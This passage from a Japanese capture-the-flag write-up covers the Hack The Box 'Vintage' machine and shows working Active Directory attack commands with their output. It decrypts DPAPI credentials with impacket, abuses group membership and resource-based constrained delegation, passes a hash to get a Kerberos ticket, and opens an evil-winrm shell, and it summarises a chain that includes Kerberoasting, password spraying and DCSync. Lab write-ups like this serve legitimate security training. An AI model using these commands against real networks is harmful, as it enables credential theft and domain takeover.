Guid        : 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0x55d51b40d9aa74e8cdc44a6d24a25c96451449229739a1c9dd2bb50048b60a652b5330ff2635a511210209b28f81c3efe16b5aee3d84b5a1be3477a62e25989f
                                                                                                                                                                               
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ impacket-dpapi masterkey -file mk2.masterkey -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a

```

資格情報マネージャを上で取得した鍵で開くか試す
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ impacket-dpapi credential -file cred.blob -key 0x55d51b40d9aa74e8cdc44a6d24a25c96451449229739a1c9dd2bb50048b60a652b5330ff2635a511210209b28f81c3efe16b5aee3d84b5a1be3477a62e25989f
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ERROR: Padding is incorrect.
                                                                                                                                                                               
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ impacket-dpapi credential -file cred.blob -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2024-06-07 15:08:23+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=admin_acc
Description : 
Unknown     : 
Username    : vintage\c.neri_adm
Unknown     : Uncr4ck4bl3P4ssW0rd0312

```

これで、c.neri_admの平文パスワードがUncr4ck4bl3P4ssW0rd0312であるとわかった
### c.neri_admの認証情報
c.neri_adm : Uncr4ck4bl3P4ssW0rd0312

![](https://i.imgur.com/m9hqrL0.png)

RDPポートが閉まってる
![](https://i.imgur.com/0LYMKsj.png)

AddSelfして
![](https://i.imgur.com/CDGrOY9.png)

AllowedActできる
![](https://i.imgur.com/zAju4mU.png)

TGTを取得
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ KRB5CCNAME="$PWD/C.NERI_ADM.ccache" \
impacket-getTGT 'vintage.htb/C.NERI_ADM:Uncr4ck4bl3P4ssW0rd0312' -dc-ip 10.129.231.205

export KRB5CCNAME="$PWD/C.NERI_ADM.ccache"
klist
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in C.NERI_ADM.ccache
Ticket cache: FILE:/home/kali/Desktop/HTB/machine/Vintage/C.NERI_ADM.ccache
Default principal: C.NERI_ADM@VINTAGE.HTB

Valid starting     Expires            Service principal
09/01/25 10:27:49  09/01/25 20:27:49  krbtgt/VINTAGE.HTB@VINTAGE.HTB
        renew until 09/02/25 10:27:48


```

**AddSelfを行う**
```sh
bloodyAD -d vintage.htb -k ccache="$PWD/C.NERI_ADM.ccache" --host dc01.vintage.htb \
  add groupMember "DelegatedAdmins" "C.NERI_ADM"
```

AllowedToActとは
- 以下を翻訳したもの

**DELEGATEDADMINS@VINTAGE.HTB** グループのメンバーは、コンピュータ **DC01.VINTAGE.HTB** の **msDS-AllowedToActOnBehalfOfOtherIdentity** 属性に追加されている。
攻撃者はこのアカウントを用いて、変更版の **S4U2Self/S4U2Proxy** 悪用チェーンを実行し、対象コンピュータに対して任意のドメインユーザーになりすまし、そのユーザー「として」の有効なサービスチケットを受け取ることができる。
注意点として、なりすますユーザーは **“Protected Users”** セキュリティグループに所属していてはならず、また委任が禁止されている（委任特権が取り消されている）場合も不可である。もう一つの注意点は、**msDS-AllowedToActOnBehalfOfOtherIdentity** の **DACL** に追加される主体（プリンシパル）には、**S4U2Self/S4U2Proxy** を成功させるために **SPN**（Service Principal Name）が必ず設定されていなければならないことだ。
もし攻撃者が現在 **SPN** が設定されたアカウントを支配していない場合でも、ドメイン既定の **MachineAccountQuota** 設定を悪用し、**Powermad** プロジェクトを用いて攻撃者が制御するコンピュータアカウントを追加することができる。

![](https://i.imgur.com/EnRgmw8.png)


あとは、以下のリンクに従って、実行できる
- 特に違う方法も見つけられなかったので割愛
https://0xdf.gitlab.io/2025/04/26/htb-vintage.html#rbcd-delegation
## L.Bianchi_adm
L.Bianchi_admのTGTの取得
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ impacket-getTGT vintage.htb/L.Bianchi_adm@dc01.vintage.htb -hashes :6b751449807e0d73065b0423b64687f0 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in L.Bianchi_adm@dc01.vintage.htb.ccache
```

root.txtの取得
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ KRB5CCNAME=L.Bianchi_adm@dc01.vintage.htb.ccache evil-winrm -i dc01.vintage.htb -r vintage.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\L.Bianchi_adm\Documents> type C:\Users\administrator\desktop\root.txt
```

## Notes

今回の流れ
1. bloodhoundでマシンが2台あることに着目
2. そのうちのDCじゃない方のマシンがPRE-WINDOWS 2000グループに属していることに着目
	1. PRE-WINDOWS 2000グループ内のマシンのパスワードは、マシンの小文字$なしという習慣に気づく
3. GMSAの認証情報取得
4. SERVICEMANAGERグループへのAddSelfとターゲットKerberoastingによるサービスアカウントのパスワードの取得
5. パスワードスプレー攻撃による横展開
6. Credential Managerに保存された資格情報の取得
7. c.neri_adm が DelegatedAdmins に GenericWrite → FS01$ をこのグループへ追加、RBCD を使って FS01$ → dc01$ に偽装（S4U）し、cifs/dc01 の ST を取得
8. dc01$ として DCSync 実行
9. ドメイン全体のハッシュ（DA含む）を取得
10. Administrator はログオン制限で不可
11. もう一人の DA L.Bianchi_admアカウントを使ってWinRM、root.txt




